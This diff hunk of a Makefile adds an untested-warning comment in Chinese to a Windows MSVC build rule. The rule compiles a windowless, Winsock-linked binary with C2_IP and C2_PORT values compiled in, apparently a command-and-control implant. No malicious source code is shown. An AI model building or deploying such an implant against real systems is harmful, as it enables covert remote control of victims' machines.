@@ -52,7 +52,7 @@ all: $(SRC)
 ifeq ($(OS),Windows_NT) # Windows
 	$(eval $(call wininput))
 	@cmd $(P)/c erase $(P)/f $(P)/q .\.nn .\nn
-ifneq ($(findstring Microsoft,$(shell $(CC) /? 2>&1)),) # Microsoft Visual Studio (MSVC)
+ifneq ($(findstring Microsoft,$(shell $(CC) /? 2>&1)),) # Microsoft Visual Studio (MSVC) !这里作者未测试过，可能需要调整
 	$(CC) $(SRC) /Fe:$(BIN).exe /O1 /DNDEBUG /DC2_IP=\"$(C2_IP)\" /DC2_PORT=$(C2_PORT) /link /subsystem:windows ws2_32.lib
 else
 ifeq ($(findstring MSYS_NT,$(shell uname -s)),MSYS_NT) # MSYS/MSYS2
